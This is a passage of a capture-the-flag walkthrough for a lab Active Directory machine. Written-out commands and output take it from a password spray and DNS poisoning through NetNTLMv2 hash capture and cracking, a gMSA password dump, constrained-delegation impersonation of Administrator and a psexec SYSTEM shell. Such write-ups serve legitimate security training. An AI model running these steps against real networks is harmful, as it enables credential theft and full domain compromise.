[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

The credentials `intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876` are valid. According to the `crackmapexec` output, it appears that this user is not an administrator and thus, unable to grant command execution with the current open ports on the machine. Use the credentials to perform Active Directory and SMB enumeration.

---

## Active Directory Enumeration - `pywerview`

With credentials of a domain user it is possible to enumerate the domain. Use [`pywerview`](https://github.com/the-useless-one/pywerview) for this.

Confirm that the target machine is the domain's DC:

```bash
$ pywerview get-netdomaincontroller -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --dc-ip 10.10.10.248 -d intelligence.htb
accountexpires:                never
badpasswordtime:               1600-12-31 19:00:00
badpwdcount:                   0
cn:                            DC
codepage:                      0
countrycode:                   0
displayname:                   DC$
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
dscorepropagationdata:         2021-04-19 00:42:42,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:00:00
lastlogon:                     2021-10-01 03:00:10.122187
lastlogontimestamp:            2021-10-01 02:59:51.232310
localpolicyflags:              0
logoncount:                    311
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb,
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb
msds-generationid:             180,
                               46,
                               110,
                               198,
                               126,
                               230,
                               9,
                               241
msds-supportedencryptiontypes: 28
name:                          DC
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    f28de281-fd79-40c5-a77b-1252b80550ed
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-10-01 02:59:27.499234
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
samaccountname:                DC$
samaccounttype:                805306369
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence,
                               HOST/DC/intelligence,
                               RestrictedKrbHost/DC,
                               HOST/DC,
                               ldap/DC,
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb,
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb,
                               DNS/dc.intelligence.htb,
                               GC/dc.intelligence.htb/intelligence.htb,
                               RestrictedKrbHost/dc.intelligence.htb,
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence,
                               HOST/dc.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence.htb,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb,
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence,
                               ldap/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence.htb
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050030...
usnchanged:                    102440
usncreated:                    12293
whenchanged:                   2021-10-01 07:59:51
whencreated:                   2021-04-19 00:42:41
```

It is. Retrieve the domain's computers.

```bash
$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --dc-ip 10.10.10.248 -d intelligence.htb --full-data
accountexpires:                 never
badpasswordtime:                1600-12-31 19:00:00
badpwdcount:                    0
cn:                             svc_int
codepage:                       0
countrycode:                    0
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
dnshostname:                    svc_int.intelligence.htb
dscorepropagationdata:          1601-01-01 00:00:00
instancetype:                   4
iscriticalsystemobject:         FALSE
isgroup:                        False
lastlogoff:                     1600-12-31 19:00:00
lastlogon:                      1600-12-31 19:00:00
localpolicyflags:               0
logoncount:                     0
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-groupmsamembership:        b'\x01\x00\x04\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05 \x00\x00\x00 \x02\x00\x00\x04\x00P\x00\x02\x00\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00F\x86\xf1\xfat\x17\r\xcaFc\xe4\xcc\xe8\x03\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00F\x86\xf1\xfat\x17\r\xcaFc\xe4\xccv\x04\x00\x00'
msds-managedpasswordid:         b'\x01\x00\x00\x00KDSK\x02\x00\x00\x00g\x01\x00\x00\x1b\x00\x00\x00\x10\x00\x00\x00Y\xae\x9dOD\x8fV\xbf\x92\xa5\xf4\x08.\xd6\xb6\x11\x00\x00\x00\x00"\x00\x00\x00"\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00'
msds-managedpasswordinterval:   30
msds-managedpasswordpreviousid: b'\x01\x00\x00\x00KDSK\x02\x00\x00\x00g\x01\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00Y\xae\x9dOD\x8fV\xbf\x92\xa5\xf4\x08.\xd6\xb6\x11\x00\x00\x00\x00"\x00\x00\x00"\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00'
msds-supportedencryptiontypes:  28
name:                           svc_int
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                    top,
                                person,
                                organizationalPerson,
                                user,
                                computer,
                                msDS-GroupManagedServiceAccount
objectguid:                     f180a079-f326-49b2-84a1-34824208d642
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
primarygroupid:                 515
pwdlastset:                     2021-06-14 09:05:22.354016
samaccountname:                 svc_int$
samaccounttype:                 805306369
useraccountcontrol:             ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
usnchanged:                     28709
usncreated:                     12846
whenchanged:                    2021-06-14 14:05:22
whencreated:                    2021-04-19 00:49:58
accountexpires:                never
badpasswordtime:               1600-12-31 19:00:00
badpwdcount:                   0
cn:                            DC
codepage:                      0
countrycode:                   0
displayname:                   DC$
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
dscorepropagationdata:         2021-04-19 00:42:42,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:00:00
lastlogon:                     2021-10-01 03:00:10.122187
lastlogontimestamp:            2021-10-01 02:59:51.232310
localpolicyflags:              0
logoncount:                    311
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb,
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb
msds-generationid:             180,
                               46,
                               110,
                               198,
                               126,
                               230,
                               9,
                               241
msds-supportedencryptiontypes: 28
name:                          DC
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    f28de281-fd79-40c5-a77b-1252b80550ed
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-10-01 02:59:27.499234
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
samaccountname:                DC$
samaccounttype:                805306369
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence,
                               HOST/DC/intelligence,
                               RestrictedKrbHost/DC,
                               HOST/DC,
                               ldap/DC,
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb,
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb,
                               DNS/dc.intelligence.htb,
                               GC/dc.intelligence.htb/intelligence.htb,
                               RestrictedKrbHost/dc.intelligence.htb,
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence,
                               HOST/dc.intelligence.htb,
                               HOST/dc.intelligence.htb/intelligence.htb,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb,
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence,
                               ldap/dc.intelligence.htb,
                               ldap/dc.intelligence.htb/intelligence.htb
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050030...
usnchanged:                    102440
usncreated:                    12293
whenchanged:                   2021-10-01 07:59:51
whencreated:                   2021-04-19 00:42:41
```

There are two computers on the domain: `dc.intelligence.htb` and `svc_int.intelligence.htb`. `svc_int.intelligence.htb` is a service account and its `msds-allowedtodelegateto` value of the service principal name (SPN)  `WWW/dc.intelligence.htb` indicates that it has constrained delegation (see [here](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview) and [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)) on that SPN. This means that credentials to this account would be a direct path to domain administrator.

Retrieve the domain's groups.

```bash
$ pywerview get-netgroup -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --dc-ip 10.10.10.248 -d intelligence.htb
samaccountname: sysadmin
samaccountname: itsupport
samaccountname: dba
samaccountname: DnsUpdateProxy
samaccountname: DnsAdmins
samaccountname: Enterprise Key Admins
samaccountname: Key Admins
samaccountname: Protected Users
samaccountname: Cloneable Domain Controllers
samaccountname: Enterprise Read-only Domain Controllers
samaccountname: Read-only Domain Controllers
samaccountname: Denied RODC Password Replication Group
samaccountname: Allowed RODC Password Replication Group
samaccountname: Terminal Server License Servers
samaccountname: Windows Authorization Access Group
samaccountname: Incoming Forest Trust Builders
samaccountname: Pre-Windows 2000 Compatible Access
samaccountname: Account Operators
samaccountname: Server Operators
samaccountname: RAS and IAS Servers
samaccountname: Group Policy Creator Owners
samaccountname: Domain Guests
samaccountname: Domain Users
samaccountname: Domain Admins
samaccountname: Cert Publishers
samaccountname: Enterprise Admins
samaccountname: Schema Admins
samaccountname: Domain Controllers
samaccountname: Domain Computers
samaccountname: Storage Replica Administrators
samaccountname: Remote Management Users
samaccountname: Access Control Assistance Operators
samaccountname: Hyper-V Administrators
samaccountname: RDS Management Servers
samaccountname: RDS Endpoint Servers
samaccountname: RDS Remote Access Servers
samaccountname: Certificate Service DCOM Access
samaccountname: Event Log Readers
samaccountname: Cryptographic Operators
samaccountname: IIS_IUSRS
samaccountname: Distributed COM Users
samaccountname: Performance Log Users
samaccountname: Performance Monitor Users
samaccountname: Network Configuration Operators
samaccountname: Remote Desktop Users
samaccountname: Replicator
samaccountname: Backup Operators
samaccountname: Print Operators
samaccountname: Guests
samaccountname: Users
samaccountname: Administrators
```

The groups `sysadmin`, `itsupport`, and `dba` are all non-standard Active Directory groups. Read more into them.

```bash
$ pywerview get-netgroup -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --dc-ip 10.10.10.248 -d intelligence.htb --groupname sysadmin
cn:                    Server Admin
displayname:           Server Administrators
distinguishedname:     CN=Server Admin,CN=Users,DC=intelligence,DC=htb
dscorepropagationdata: 1601-01-01 00:00:00
grouptype:             -2147483646
instancetype:          4
isgroup:               True
member:                CN=Jason Patterson,CN=Users,DC=intelligence,DC=htb
name:                  Server Admin
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:           top,
                       group
objectguid:            f9b4f973-8e5a-489e-9bee-9b4565d5f119
objectsid:             S-1-5-21-4210132550-3389855604-3437519686-1143
samaccountname:        sysadmin
samaccounttype:        268435456
usnchanged:            12839
usncreated:            12829
whenchanged:           2021-04-19 00:49:48
whencreated:           2021-04-19 00:49:48
```

```bash
$
cn:                    IT Support
displayname:           IT Support
distinguishedname:     CN=IT Support,CN=Users,DC=intelligence,DC=htb
dscorepropagationdata: 1601-01-01 00:00:00
grouptype:             -2147483646
instancetype:          4
isgroup:               True
member:                CN=Ted Graves,CN=Users,DC=intelligence,DC=htb,
                       CN=Laura Lee,CN=Users,DC=intelligence,DC=htb
name:                  IT Support
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:           top,
                       group
objectguid:            e4dd3084-38fc-4cf8-ba5c-b7d9b0635092
objectsid:             S-1-5-21-4210132550-3389855604-3437519686-1142
samaccountname:        itsupport
samaccounttype:        268435456
usnchanged:            12836
usncreated:            12825
whenchanged:           2021-04-19 00:49:48
whencreated:           2021-04-19 00:49:48
```

```bash
$ pywerview get-netgroup -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --dc-ip 10.10.10.248 -d intelligence.htb --groupname 'DBA' --full-data
cn:                    DBA
displayname:           Database Administrator
distinguishedname:     CN=DBA,CN=Users,DC=intelligence,DC=htb
dscorepropagationdata: 1601-01-01 00:00:00
grouptype:             -2147483646
instancetype:          4
isgroup:               True
member:                CN=Jeremy Mora,CN=Users,DC=intelligence,DC=htb
name:                  DBA
objectcategory:        CN=Group,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:           top,
                       group
objectguid:            f471936e-b333-493d-894d-7e32054f9db9
objectsid:             S-1-5-21-4210132550-3389855604-3437519686-1141
samaccountname:        dba
samaccounttype:        268435456
usnchanged:            12842
usncreated:            12821
whenchanged:           2021-04-19 00:49:50
whencreated:           2021-04-19 00:49:48
```

All three of these groups seem interesting and their users' credentials should be prioritized.

---

## Active Directory Enumeration - Bloodhound

Run [Bloodhound](https://github.com/BloodHoundAD/BloodHound) with `Tiffany.Molina`'s credentials.

```bash
$ bloodhound-python -d intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All -ns 10.10.10.248
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.2023167610168457 seconds
INFO: Done in 00M 08S
```

Look at the result of the "Shortest Paths to Unconstrained Delegation Systems" pre-built query.

![](images/Pasted%20image%2020211001175931.png)

It shows the constrained delegation from the service account `svc_int@intelligence.htb` to `dc@intelligence.htb` noted earlier and also that members of the `ITSUPPORT@intelligence.htb` group have `ReadGMSAPassword` permission on `svc_int@intelligence.htb`. This permissions allows users of the `ITSUPPORT@intelligence.htb` group to retrieve the password for the `svc_int@intelligence.htb` service account. This means that if it's possible to access a user account in this group (`Ted.Graves` or `Laura.Lee`), there is a path to domain administrator.

---

## Credentialed SMB Access

Use `Tiffany.Molina`'s credentials to list the server's SMB shares.

```bash
$ smbmap -H dc.intelligence.htb -u Tiffany.Molina -d intelligence.htb -p NewIntelligenceCorpUser9876
[+] IP: dc.intelligence.htb:445 Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```

Access the `Users` share at retrieve the user flag from `\\dc.intelligence\Users\Tiffany.Molina\Desktop\user.txt`.

```bash
$ smbclient -U intelligence.htb/Tiffany.Molina //dc.intelligence.htb/Users
Enter INTELLIGENCE.HTB\Tiffany.Molina's password:
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

Investigate the remainder of the `Users` share and the `IT` share.

`downdetector.ps1` script from `IT` share:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach ($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
	try {
		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
		if (.StatusCode -ne 200) {
		Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
		}
	} catch {}
}
```

According to the comment, this script is being ran every 5 minutes. It's querying LDAP for all Active Directory Integrated Domain Name Service (ADIDNS) hostnames and filtering out those that don't begin with `web*`. For each of the remaining hostnames, the target sends an HTTP request to that host with the credentials of the user that the script runs as. According to the email message it sends, this user is probably `Ted.Graves@intelligence.htb`, one of the members of the IT Support group.

---

## Active Directory Integrated DNS Poisoning

By default, ADIDNS allows any domain user to add DNS entries. Use [responder's DNSUpdate.py](https://github.com/Sagar-Jangam/DNSUpdate) and `Tiffany.Molina`'s credentials to create a DNS record that matches the pattern `web*.intelligence.htb` and maps to the attacker's IP address.

```bash
$ python3 /usr/share/responder/tools/DNSUpdate.py -DNS 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r webtgihf -d 10.10.14.151
Connecting to host...
Binding to host
Bind OK
/usr/share/responder/tools/DNSUpdate.py:58: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
Adding the record
{'result': 0, 'description': 'success', 'dn': ''}
```

Fire up [responder](https://github.com/SpiderLabs/Responder) to listen on the `tun0` interface and respond to the target's HTTP request, grabbing their NetNTLMv2 hash.

```bash
$ └──╼ $ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.151]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FJ1KWMFZVGG]
    Responder Domain Name      [DBCF.LOCAL]
    Responder DCE-RPC Port     [49911]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:b1bb50941b3d1d89:DFB35AF1F21041A9EB9B327562A711EF:010100000000000000BA103240B4D701A1E679DCEB1A5DB10000000002000800440042004300460001001E00570049004E002D0046004A0031004B0057004D0046005A005600470047000400140044004200430046002E004C004F00430041004C0003003400570049004E002D0046004A0031004B0057004D0046005A005600470047002E0044004200430046002E004C004F00430041004C000500140044004200430046002E004C004F00430041004C0008003000300000000000000000000000002000000EC603BEB71AE176C646B05E451415A17CECCE8FCBC29D10E1B9FAAB74BB7E800A001000000000000000000000000000000000000900360048005400540050002F00770065006200620079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Use `hashcat` to crack the hash.

```bash
hashcat -a 0 -m 5600 'Ted.Graves::intelligence:b1bb50941b3d1d89:DFB35AF1F21041A9EB9B327562A711EF:010100000000000000BA103240B4D701A1E679DCEB1A5DB10000000002000800440042004300460001001E00570049004E002D0046004A0031004B0057004D0046005A005600470047000400140044004200430046002E004C004F00430041004C0003003400570049004E002D0046004A0031004B0057004D0046005A005600470047002E0044004200430046002E004C004F00430041004C000500140044004200430046002E004C004F00430041004C0008003000300000000000000000000000002000000EC603BEB71AE176C646B05E451415A17CECCE8FCBC29D10E1B9FAAB74BB7E800A001000000000000000000000000000000000000900360048005400540050002F00770065006200620079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' rockyou.txt
```

The hash is successfully cracked and `Ted.Graves`'s password is `Mr.Teddy`.

---

## Ted to a Domain Administrator

According to `crackmapexec`, `Ted.Grave`'s credentials aren't capable of granting shell access by themselves. However, the Active Directory information gathered via Bloodhound earlier shows a direct path from `Ted.Grave`'s account to domain administrator through `Ted.Grave`'s read Group Managed Service Account (GMSA) password permission on `svc_int@intelligence.htb` and `svc_int@intelligence.htb`'s constrained delegation on `dc@intelligence.htb`. Read `svc_int@intelligence.htb`'s GMSA password hash.

```bash
$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d170ae19de30439df55d6430e12dd621
```

Use the password hash to abuse `svc_int@intelligence.htb`'s constrained delegation on `dc@intelligence.htb` to impersonate `Administrator@intelligence.htb` and create a ticket.

```bash
$ impacket-getST intelligence.htb/svc_int -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb -impersonate Administrator -hashes :d170ae19de30439df55d6430e12dd621
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Use the domain administrator's ticket to access the machine and retrieve the system flag.

```bash
$ export KRB5CCNAME=Administrator.ccache
$ impacket-psexec -k -no-pass dc.intelligence.htb
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file NUGBpOPb.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service TWyB on dc.intelligence.htb.....
[*] Starting service TWyB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
